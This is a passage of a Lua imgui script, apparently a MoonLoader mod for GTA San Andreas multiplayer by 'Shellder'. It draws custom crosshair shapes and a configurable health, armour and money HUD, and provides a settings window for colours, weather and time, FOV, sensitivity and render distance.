            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX + tamanho, centroY),
            imgui.ImVec2(centroX, centroY + tamanho),
            imgui.ImVec2(centroX - tamanho, centroY)
        }
        for i = 1, 4 do
            local j = i % 4 + 1
            desenho:AddLine(
                pontosDiamante[i],
                pontosDiamante[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 17 then
        local raio = tamanho
        local pontosEstrela = {}
        for i = 1, 6 do
            local angulo = math.rad(i * 60 - 90)
            local x = centroX + math.cos(angulo) * raio
            local y = centroY + math.sin(angulo) * raio
            table.insert(pontosEstrela, imgui.ImVec2(x, y))
        end
        for i = 1, 6 do
            local j = i % 6 + 1
            desenho:AddLine(
                pontosEstrela[i],
                pontosEstrela[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 18 then
        local pontosTriangulo = {
            imgui.ImVec2(centroX, centroY + tamanho),
            imgui.ImVec2(centroX + tamanho, centroY - tamanho),
            imgui.ImVec2(centroX - tamanho, centroY - tamanho)
        }
        for i = 1, 3 do
            local j = i % 3 + 1
            desenho:AddLine(
                pontosTriangulo[i],
                pontosTriangulo[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 19 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho / 2, centroY - tamanho / 2),
            imgui.ImVec2(centroX + tamanho / 2, centroY + tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho / 2, centroY - tamanho / 2),
            imgui.ImVec2(centroX - tamanho / 2, centroY + tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 20 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX - tamanho / 2, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho / 2, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY - tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY + tamanho / 2),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho / 4,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
    elseif tipo == 21 then
        desenho:AddCircleFilled(
            imgui.ImVec2(centroX, centroY),
            tamanho / 4,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4])
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho / 2,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
    elseif tipo == 22 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 23 then
        local tamanhoQuadrado = tamanho
        desenho:AddRect(
            imgui.ImVec2(centroX - tamanhoQuadrado, centroY - tamanhoQuadrado),
            imgui.ImVec2(centroX + tamanhoQuadrado, centroY + tamanhoQuadrado),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0, 0, largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanhoQuadrado, centroY),
            imgui.ImVec2(centroX + tamanhoQuadrado, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanhoQuadrado),
            imgui.ImVec2(centroX, centroY + tamanhoQuadrado),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 24 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY - tamanho),
            imgui.ImVec2(centroX + tamanho, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho, centroY - tamanho),
            imgui.ImVec2(centroX - tamanho, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
    elseif tipo == 25 then
        local raio = tamanho
        local pontosHexagono = {}
        for i = 1, 6 do
            local angulo = math.rad(i * 60 - 90)
            local x = centroX + math.cos(angulo) * raio
            local y = centroY + math.sin(angulo) * raio
            table.insert(pontosHexagono, imgui.ImVec2(x, y))
        end
        for i = 1, 6 do
            local j = i % 6 + 1
            desenho:AddLine(
                pontosHexagono[i],
                pontosHexagono[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 26 then
        local raio = tamanho
        local pontosOctogono = {}
        for i = 1, 8 do
            local angulo = math.rad(i * 45 - 90)
            local x = centroX + math.cos(angulo) * raio
            local y = centroY + math.sin(angulo) * raio
            table.insert(pontosOctogono, imgui.ImVec2(x, y))
        end
        for i = 1, 8 do
            local j = i % 8 + 1
            desenho:AddLine(
                pontosOctogono[i],
                pontosOctogono[j],
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 27 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        for i = 0, 7 do
            local angulo = math.rad(i * 45)
            local x1 = centroX + math.cos(angulo) * tamanho
            local y1 = centroY + math.sin(angulo) * tamanho
            local x2 = centroX + math.cos(angulo) * (tamanho / 2)
            local y2 = centroY + math.sin(angulo) * (tamanho / 2)
            desenho:AddLine(
                imgui.ImVec2(x1, y1),
                imgui.ImVec2(x2, y2),
                rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
                largura
            )
        end
    elseif tipo == 28 then
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX - tamanho / 2, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho / 2, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY - tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY + tamanho / 2),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho / 2, centroY - tamanho / 2),
            imgui.ImVec2(centroX + tamanho / 2, centroY + tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX + tamanho / 2, centroY - tamanho / 2),
            imgui.ImVec2(centroX - tamanho / 2, centroY + tamanho / 2),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    elseif tipo == 29 then
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho / 2,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddCircle(
            imgui.ImVec2(centroX, centroY),
            tamanho / 4,
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            0,
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX - tamanho, centroY),
            imgui.ImVec2(centroX + tamanho, centroY),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
        desenho:AddLine(
            imgui.ImVec2(centroX, centroY - tamanho),
            imgui.ImVec2(centroX, centroY + tamanho),
            rgba(config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
            largura
        )
    end
end
imgui.OnFrame(function() return true end, function()
    if dependenciasOk then
        if texVida == nil then
            texVida = imgui.CreateTextureFromFile(getWorkingDirectory() .. "/web/shelldervida.png")
        end
        if texColete == nil then
            texColete = imgui.CreateTextureFromFile(getWorkingDirectory() .. "/web/shelldercolete.png")
        end
    end
    local larguraTela, alturaTela = getScreenResolution()
    imgui.SetNextWindowPos(imgui.ImVec2(0, 0))
    imgui.SetNextWindowSize(imgui.ImVec2(larguraTela, alturaTela))
    imgui.Begin("HUD_ORIGINAL", nil,
        imgui.WindowFlags.NoDecoration +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.NoBackground +
        imgui.WindowFlags.NoInputs +
        imgui.WindowFlags.NoBringToFrontOnFocus
    )
    local desenho = imgui.GetWindowDrawList()
    local pos = imgui.GetWindowPos()
    desenharMira(desenho, pos)
    estado.opacidadeTexto[0] = estado.opacidadeTexto[0] + (estado.direcaoFade * 0.01)
    if estado.opacidadeTexto[0] >= 1.0 then
        estado.opacidadeTexto[0] = 1.0
        estado.direcaoFade = -1
        estado.indiceCor = estado.indiceCor % #listaCores + 1
    elseif estado.opacidadeTexto[0] <= 0.0 then
        estado.opacidadeTexto[0] = 0.0
        estado.direcaoFade = 1
    end
    local corTexto = listaCores[estado.indiceCor]
    local textoY = pos.y + alturaTela - 30
    local textoX = pos.x + 50
    desenho:AddText(imgui.ImVec2(textoX, textoY), 
                 rgba(corTexto[1], corTexto[2], corTexto[3], estado.opacidadeTexto[0]), 
                 "by shellder")
    if estado.modoEdicao[0] then
        for k, v in pairs(variaveis) do
            if k == "vidaX" then config.vidaX = v[0]
            elseif k == "vidaY" then config.vidaY = v[0]
            elseif k == "vidaLargura" then config.vidaLargura = v[0]
            elseif k == "vidaAltura" then config.vidaAltura = v[0]
            elseif k == "coleteX" then config.coleteX = v[0]
            elseif k == "coleteY" then config.coleteY = v[0]
            elseif k == "coleteLargura" then config.coleteLargura = v[0]
            elseif k == "coleteAltura" then config.coleteAltura = v[0]
            elseif k == "dinheiroX" then config.dinheiroX = v[0]
            elseif k == "dinheiroY" then config.dinheiroY = v[0]
            elseif k == "tamanhoDinheiro" then config.tamanhoDinheiro = v[0]
            elseif k == "tamanhoBordaDinheiro" then config.tamanhoBordaDinheiro = v[0]
            elseif k == "raioBorda" then config.raioBorda = v[0]
            elseif k == "tamanhoFonteHP" then config.tamanhoFonteHP = v[0]
            elseif k == "tamanhoFonteAP" then config.tamanhoFonteAP = v[0]
            elseif k == "tamanhoFonteDinheiro" then config.tamanhoFonteDinheiro = v[0]
            elseif k == "deslocamentoIconeX" then config.deslocamentoIconeX = v[0]
            elseif k == "deslocamentoIconeY" then config.deslocamentoIconeY = v[0]
            elseif k == "tamanhoIcone" then config.tamanhoIcone = v[0]
            elseif k == "fonteHPX" then config.fonteHPX = v[0]
            elseif k == "fonteHPY" then config.fonteHPY = v[0]
            elseif k == "fonteAPX" then config.fonteAPX = v[0]
            elseif k == "fonteAPY" then config.fonteAPY = v[0]
            elseif k == "miraAtivada" then config.miraAtivada = v[0]
            elseif k == "miraX" then config.miraX = v[0]
            elseif k == "miraY" then config.miraY = v[0]
            elseif k == "miraTamanho" then config.miraTamanho = v[0]
            elseif k == "miraLargura" then config.miraLargura = v[0]
            elseif k == "miraBordaAtivada" then config.miraBordaAtivada = v[0]
            elseif k == "miraTamanhoBorda" then config.miraTamanhoBorda = v[0]
            elseif k == "miraTipo" then config.miraTipo = v[0]
            elseif k == "tempoId" then config.tempoId = v[0]
            elseif k == "climaId" then config.climaId = v[0]
            elseif k == "climaAtivo" then config.climaAtivo = v[0]
            elseif k == "fovAtivado" then config.fovAtivado = v[0]
            elseif k == "valorFov" then config.valorFov = v[0]
            elseif k == "somenteNumerosHPAP" then config.somenteNumerosHPAP = v[0]
            elseif k == "emojisAtivados" then config.emojisAtivados = v[0]
            elseif k == "sensibilidade" then config.sensibilidade = v[0]
            elseif k == "fixedZoom" then config.fixedZoom = v[0]
            elseif k == "renderDistance" then config.renderDistance = v[0]
            end
        end
        config.corMira = {variaveis.corMira[0], variaveis.corMira[1], variaveis.corMira[2], variaveis.corMira[3]}
        config.corBordaMira = {variaveis.corBordaMira[0], variaveis.corBordaMira[1], variaveis.corBordaMira[2], variaveis.corBordaMira[3]}
        config.corVida = {variaveis.corVida[0], variaveis.corVida[1], variaveis.corVida[2], variaveis.corVida[3]}
        config.corColete = {variaveis.corColete[0], variaveis.corColete[1], variaveis.corColete[2], variaveis.corColete[3]}
        config.corDinheiro = {variaveis.corDinheiro[0], variaveis.corDinheiro[1], variaveis.corDinheiro[2], variaveis.corDinheiro[3]}
        config.corBordaDinheiro = {variaveis.corBordaDinheiro[0], variaveis.corBordaDinheiro[1], variaveis.corBordaDinheiro[2], variaveis.corBordaDinheiro[3]}
        config.corFonte = {variaveis.corFonte[0], variaveis.corFonte[1], variaveis.corFonte[2], variaveis.corFonte[3]}
        verificarMudancasESalvar()
    end
    desenharHUDOriginal(desenho, pos)
    imgui.End()
end)
local function TextoCentralizado(texto)
    imgui.SetCursorPosX(imgui.GetWindowWidth() / 2 - imgui.CalcTextSize(texto).x / 2)
    imgui.Text(texto)
end
imgui.OnFrame(function() return estado.modoEdicao[0] end, function()
    imgui.SetNextWindowSize(imgui.ImVec2(600, 700), imgui.Cond.FirstUseEver)
    imgui.SetNextWindowSizeConstraints(imgui.ImVec2(600, 700), imgui.ImVec2(600, 700))
    imgui.PushStyleColor(imgui.Col.WindowBg, imgui.ImVec4(0.0, 0.0, 0.0, 0.8))
    imgui.PushStyleColor(imgui.Col.TitleBg, imgui.ImVec4(0.1, 0.1, 0.1, 0.9))
    imgui.PushStyleColor(imgui.Col.TitleBgActive, imgui.ImVec4(0.2, 0.2, 0.2, 0.9))
    imgui.PushStyleColor(imgui.Col.Button, imgui.ImVec4(0.3, 0.3, 0.3, 0.8))
    imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(0.4, 0.4, 0.4, 0.9))
    imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(0.5, 0.5, 0.5, 1.0))
    imgui.PushStyleColor(imgui.Col.Header, imgui.ImVec4(0.2, 0.2, 0.2, 0.8))
    imgui.PushStyleColor(imgui.Col.HeaderHovered, imgui.ImVec4(0.3, 0.3, 0.3, 0.9))
    imgui.PushStyleColor(imgui.Col.HeaderActive, imgui.ImVec4(0.4, 0.4, 0.4, 1.0))
    imgui.PushStyleColor(imgui.Col.FrameBg, imgui.ImVec4(0.15, 0.15, 0.15, 0.8))
    imgui.PushStyleColor(imgui.Col.FrameBgHovered, imgui.ImVec4(0.25, 0.25, 0.25, 0.9))
    imgui.PushStyleColor(imgui.Col.FrameBgActive, imgui.ImVec4(0.35, 0.35, 0.35, 1.0))
    imgui.PushStyleColor(imgui.Col.SliderGrab, imgui.ImVec4(0.4, 0.4, 0.4, 1.0))
    imgui.PushStyleColor(imgui.Col.SliderGrabActive, imgui.ImVec4(0.5, 0.5, 0.5, 1.0))
    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(1.0, 1.0, 1.0, 1.0))
    imgui.PushStyleColor(imgui.Col.Tab, imgui.ImVec4(0.5, 0.0, 0.0, 0.8))
    imgui.PushStyleColor(imgui.Col.TabHovered, imgui.ImVec4(0.8, 0.0, 0.0, 0.9))
    imgui.PushStyleColor(imgui.Col.TabActive, imgui.ImVec4(1.0, 0.0, 0.0, 1.0))
    local janelaAberta = imgui.Begin("HUD ESTILO PC - by Shellder", estado.modoEdicao, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
    local desenho = imgui.GetWindowDrawList()
    local posJanela = imgui.GetWindowPos()
    local tamanhoJanela = imgui.GetWindowSize()
    estado.opacidadeTexto[0] = estado.opacidadeTexto[0] + (estado.direcaoFade * 0.01)
    if estado.opacidadeTexto[0] >= 1.0 then
        estado.opacidadeTexto[0] = 1.0
        estado.direcaoFade = -1
        estado.indiceCor = estado.indiceCor % #listaCores + 1
    elseif estado.opacidadeTexto[0] <= 0.0 then
        estado.opacidadeTexto[0] = 0.0
        estado.direcaoFade = 1
    end
    local corTexto = listaCores[estado.indiceCor]
    local textoY = posJanela.y + 40
    local textoX = tamanhoJanela.x / 2 - imgui.CalcTextSize("by Shellder").x / 2
    desenho:AddText(imgui.ImVec2(textoX, textoY), 
                 rgba(corTexto[1], corTexto[2], corTexto[3], estado.opacidadeTexto[0]), 
                 "by Shellder")
    imgui.Spacing()
    imgui.Spacing()
    if imgui.BeginTabBar("##AbasHUD") then
        if imgui.BeginTabItem("ESTILO HUD") then
            imgui.Spacing()
            imgui.Separator()
            imgui.Spacing()
            if imgui.CollapsingHeader("OPÇÕES DE EXIBIÇÃO", imgui.TreeNodeFlags.DefaultOpen) then
                if imgui.Checkbox("Contador Vida/Colete", variaveis.somenteNumerosHPAP) then
                    verificarMudancasESalvar()
                end
                if imgui.Checkbox("Ativar/Desativar Ícones", variaveis.emojisAtivados) then
                    verificarMudancasESalvar()
                end
            end
            imgui.Spacing()
            imgui.Separator()
            imgui.Spacing()
            if imgui.CollapsingHeader("CONFIGURAÇÃO DE ÍCONES", imgui.TreeNodeFlags.DefaultOpen) then
                imgui.Text("Posição Dos Ícones")
                if imgui.SliderInt("Posição X", variaveis.deslocamentoIconeX, -200, 200) then
                    verificarMudancasESalvar()
                end
                if imgui.SliderInt("Posição Y", variaveis.deslocamentoIconeY, -200, 200) then
                    verificarMudancasESalvar()
                end
                imgui.Text("Tamanho Dos Ícones")
                if imgui.SliderFloat("Tamanho", variaveis.tamanhoIcone, 10.0, 30.0) then
                    verificarMudancasESalvar()
                end
                imgui.Text("")
            end
            imgui.Spacing()
            imgui.Separator()
            imgui.Spacing()
            if imgui.CollapsingHeader("CONFIGURAÇÃO DE FONTES", imgui.TreeNodeFlags.DefaultOpen) then
                imgui.Text("POSIÇÃO DO CONTADOR OF VIDA")
                if imgui.SliderInt("FONTE X", variaveis.fonteHPX, -1000, 1000) then
                    verificarMudancasESalvar()
                end
                if imgui.SliderInt("FONTE Y", variaveis.fonteHPY, -1000, 1000) then
                    verificarMudancasESalvar()
                end
                imgui.Text("POSIÇÃO DO CONTADOR DE COLETE")
                if imgui.SliderInt("FONTE X", variaveis.fonteAPX, -1000, 1000) then
                    verificarMudancasESalvar()
                end
                if imgui.SliderInt("FONTE Y", variaveis.fonteAPY, -1000, 1000) then
                    verificarMudancasESalvar()
                end
                imgui.Text("TAMANHO DOS CONTADORES")
                if imgui.SliderFloat("FONTE DE VIDA", variaveis.tamanhoFonteHP, 8.0, 30.0) then
                    verificarMudancasESalvar()
                end
                if imgui.SliderFloat("FONTE DE COLETE", variaveis.tamanhoFonteAP, 8.0, 30.0) then
                    verificarMudancasESalvar()
                end
                imgui.Text("")
            end
            imgui.Spacing()
            imgui.Separator()
            imgui.Spacing()
            if imgui.CollapsingHeader("AJUSTAR VIDA/COLETE", imgui.TreeNodeFlags.DefaultOpen) then
                if imgui.Checkbox("Mover Vida/colete Juntos", variaveis.moverJuntos) then
                    verificarMudancasESalvar()
                end
                if variaveis.moverJuntos[0] then
                    imgui.Text("Posicao Da Vida/colete")
                    if imgui.SliderInt("VIDA/COLETE X", variaveis.vidaX, 0, 3000) then
                        variaveis.coleteX[0] = variaveis.vidaX[0]
                        verificarMudancasESalvar()
                    end
                    if imgui.SliderInt("Vida/colete Y", variaveis.vidaY, 0, 3000) then
                        variaveis.coleteY[0] = variaveis.vidaY[0] + 42
                        verificarMudancasESalvar()
                    end
                else
                    imgui.Text("POSICAO VIDA (X, Y):")
                    if imgui.SliderInt("Vida X", variaveis.vidaX, 0, 3000) then
                        verificarMudancasESalvar()
                    end
                    if imgui.SliderInt("Vida Y", variaveis.vidaY, 0, 3000) then
                        verificarMudancasESalvar()
                    end
                    imgui.Spacing()
                    imgui.Separator()
                    imgui.Spacing()
                    if imgui.SliderInt("Colete X", variaveis.coleteX, 0, 3000) then
                        verificarMudancasESalvar()
                    end
                    if imgui.SliderInt("Colete Y", variaveis.coleteY, 0, 3000) then
                        verificarMudancasESalvar()
                    end
                end
	                imgui.Text("Ajustar Vida")
	                if imgui.SliderInt("Largura Vida##V", variaveis.vidaLargura, 30, 1000) then
	                    verificarMudancasESalvar()
	                end
	                if imgui.SliderInt("Altura Vida##V", variaveis.vidaAltura, 5, 200) then
	                    verificarMudancasESalvar()
	                end
	                imgui.Spacing()
	                imgui.Text("Ajustar Colete")
	                if imgui.SliderInt("Largura Colete##C", variaveis.coleteLargura, 30, 1000) then
	                    verificarMudancasESalvar()
	                end
	                if imgui.SliderInt("Altura Colete##C", variaveis.coleteAltura, 5, 200) then
	                    verificarMudancasESalvar()
	                end
            end
            imgui.Spacing()
            if imgui.CollapsingHeader("Dinheiro Configs", imgui.TreeNodeFlags.DefaultOpen) then
                imgui.Text("Ajustar Dinheiro")
                if imgui.SliderInt("Dinheiro X", variaveis.dinheiroX, 0, 3000) then
                    verificarMudancasESalvar()
                end
                if imgui.SliderInt("Dinheiro Y", variaveis.dinheiroY, 0, 3000) then
                    verificarMudancasESalvar()
                end
                imgui.Text("Tamanho Da Fonte")
                if imgui.SliderFloat("Fonte", variaveis.tamanhoFonteDinheiro, 8.0, 30.0) then
                    verificarMudancasESalvar()
                end
            end
            imgui.EndTabItem()
        end
        if imgui.BeginTabItem("CORES HUD") then
            if imgui.CollapsingHeader("CORES DO HUD", imgui.TreeNodeFlags.DefaultOpen) then
                if imgui.ColorEdit4(" VIDA", variaveis.corVida) then
                    verificarMudancasESalvar()
                end
                imgui.Separator()
                if imgui.ColorEdit4(" COLETE", variaveis.corColete) then
                    verificarMudancasESalvar()
                end
                imgui.Separator()
                if imgui.ColorEdit4(" DINHEIRO", variaveis.corDinheiro) then
                    verificarMudancasESalvar()
                end
                imgui.Separator()
                if imgui.ColorEdit4(" FONTE", variaveis.corFonte) then
                    verificarMudancasESalvar()
                end
                imgui.Separator()
                if imgui.ColorEdit4("DINHEIRO", variaveis.corBordaDinheiro) then
                    verificarMudancasESalvar()
                end
                imgui.Separator()
                if imgui.ColorEdit4("COR MIRA", variaveis.corMira) then
                    verificarMudancasESalvar()
                end
                imgui.Separator()
                if imgui.ColorEdit4("BORDA MIRA", variaveis.corBordaMira) then
                    verificarMudancasESalvar()
                end
            end
            imgui.Spacing()
            if imgui.CollapsingHeader("BORDA DO HUD (VIDA/COLETE)", imgui.TreeNodeFlags.DefaultOpen) then
                imgui.Spacing()
                imgui.Separator()
                imgui.Spacing()
                imgui.Text("ESTILO DA BORDA (ARREDONDAMENTO)")
                imgui.Text(string.format("BORDA ATUAL: %.1f", variaveis.raioBorda[0]))
                imgui.BeginGroup()
                if imgui.Button("-", imgui.ImVec2(40, 30)) then
                    if variaveis.raioBorda[0] > 0.0 then
                        variaveis.raioBorda[0] = variaveis.raioBorda[0] - 0.5
                        verificarMudancasESalvar()
                    end
                end
                imgui.SameLine()
                if imgui.Button("+", imgui.ImVec2(40, 30)) then
                    if variaveis.raioBorda[0] < 20.0 then
                        variaveis.raioBorda[0] = variaveis.raioBorda[0] + 0.5
                        verificarMudancasESalvar()
                    end
                end
                imgui.EndGroup()
                imgui.Spacing()
                imgui.Separator()
                imgui.Spacing()
                if imgui.SliderFloat("DINHEIRO", variaveis.tamanhoBordaDinheiro, 0.5, 5.0) then
                    verificarMudancasESalvar()
                end
            end
            imgui.EndTabItem()
        end
        if imgui.BeginTabItem("MIRA EXTERNA") then
            if imgui.CollapsingHeader("Mira Externa", imgui.TreeNodeFlags.DefaultOpen) then
                if imgui.Checkbox("ATIVAR MIRA", variaveis.miraAtivada) then
                    verificarMudancasESalvar()
                end
                if variaveis.miraAtivada[0] then
                    local tipoMiraAtual = variaveis.miraTipo[0]
                    if imgui.BeginCombo(" TIPO", tiposMira[tipoMiraAtual + 1]) then
                        for i = 0, 29 do
                            if imgui.Selectable(tiposMira[i + 1], tipoMiraAtual == i) then
                                variaveis.miraTipo[0] = i
                                verificarMudancasESalvar()
                            end
                        end
                        imgui.EndCombo()
                    end
                    imgui.Separator()
                    imgui.Text("Posicao Da Mira")
                    if imgui.SliderInt("MIRA X", variaveis.miraX, -100, 100) then
                        verificarMudancasESalvar()
                    end
                    if imgui.SliderInt("MIRA Y", variaveis.miraY, -100, 100) then
                        verificarMudancasESalvar()
                    end
                    imgui.Separator()
                    if imgui.SliderFloat(" TAMANHO", variaveis.miraTamanho, 2.0, 50.0) then
                        verificarMudancasESalvar()
                    end
                    if imgui.SliderFloat(" LARGURA", variaveis.miraLargura, 1.0, 10.0) then
                        verificarMudancasESalvar()
                    end
                    imgui.Spacing()
                    imgui.Separator()
                    imgui.Spacing()
                    if imgui.Checkbox("Ativar Borda", variaveis.miraBordaAtivada) then
                        verificarMudancasESalvar()
                    end
                    if variaveis.miraBordaAtivada[0] then
                        if imgui.SliderFloat("LARGURA BORDA", variaveis.miraTamanhoBorda, 0.5, 5.0) then
                            verificarMudancasESalvar()
                        end
                    end
                end
            end
            imgui.EndTabItem()
        end
        if imgui.BeginTabItem("MODS EXTRAS") then
            if imgui.CollapsingHeader("MODIFICADOR DE CLIMA/HORA", imgui.TreeNodeFlags.DefaultOpen) then
                TextoCentralizado("Hora")
                imgui.PushItemWidth(230)
                if imgui.SliderInt("##tempo", variaveis.tempoId, 0, 23) then
                    verificarMudancasESalvar()
                end
                TextoCentralizado("Clima")
                if imgui.SliderInt("##clima", variaveis.climaId, 0, 45) then
                    verificarMudancasESalvar()
                end
                imgui.PopItemWidth()
                imgui.Spacing()
                imgui.Separator()
                imgui.Spacing()
                if variaveis.climaAtivo[0] then
                    if imgui.Button("DESATIVAR", imgui.ImVec2(190, 35)) then
                        variaveis.climaAtivo[0] = false
                        verificarMudancasESalvar()
                    end
                else
                    if imgui.Button("ATIVAR", imgui.ImVec2(190, 35)) then
                        variaveis.climaAtivo[0] = true
                        verificarMudancasESalvar()
                    end
                end
            end
            imgui.Spacing()
            imgui.Separator()
            imgui.Spacing()
            if imgui.CollapsingHeader("FOV CHANGER - by Shellder", imgui.TreeNodeFlags.DefaultOpen) then
                imgui.Spacing()
                if imgui.Checkbox("ATIVAR FOV CHANGER", variaveis.fovAtivado) then
                    verificarMudancasESalvar()
                end
                if variaveis.fovAtivado[0] then
                    if imgui.SliderInt("FOV", variaveis.valorFov, 10, 135) then
                        verificarMudancasESalvar()
                    end
                    if imgui.Button("RESETAR FOV", imgui.ImVec2(190, 35)) then
                        variaveis.valorFov[0] = 60
                        verificarMudancasESalvar()
                    end
                else
                    if imgui.Button("ATIVAR FOV CHANGER", imgui.ImVec2(190, 35)) then
                        variaveis.fovAtivado[0] = true
                        verificarMudancasESalvar()
                    end
                end
            end
            imgui.Spacing()
            imgui.Separator()
            imgui.Spacing()
            if imgui.CollapsingHeader("SENSIBILIDADE E TELA", imgui.TreeNodeFlags.DefaultOpen) then
                imgui.Spacing()
                imgui.PushItemWidth(250)
                TextoCentralizado("Sensibilidade")
                if imgui.SliderFloat("##sens", variaveis.sensibilidade, 1, 100, "%.0f") then
                    verificarMudancasESalvar()
                end
                TextoCentralizado("Fixed Zoom")
                local zoomtext = variaveis.fixedZoom[0] == 0 and "off" or "%.1f"
                if imgui.SliderFloat("##Zoom", variaveis.fixedZoom, 0, 5, zoomtext) then
                    verificarMudancasESalvar()
                end
                TextoCentralizado("Render Distance")
                if imgui.SliderFloat("##renderdist", variaveis.renderDistance, 50, 1200, "%.0f") then
                    verificarMudancasESalvar()
                end
                imgui.PopItemWidth()
            end
            imgui.EndTabItem()
        end
        imgui.EndTabBar()
    end
